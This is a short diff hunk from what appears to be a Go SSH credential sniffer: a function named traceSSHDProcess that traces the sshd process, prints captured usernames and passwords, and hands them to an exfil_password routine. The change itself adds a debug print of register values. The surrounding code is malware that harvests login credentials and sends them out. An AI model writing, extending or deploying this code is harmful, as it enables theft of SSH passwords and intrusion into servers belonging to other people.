@@ -59,6 +59,8 @@ func traceSSHDProcess(pid int) {
 						fmt.Printf("Username: %q, Password %q\n", username, password)
 						go exfil_password(username, removeFirstFourBytes(password))
 					}
+				} else {
+					fmt.Printf("rdi: %d, rax: %d\n", regs.Rdi, regs.Orig_rax)
 				}
 			}
 		}
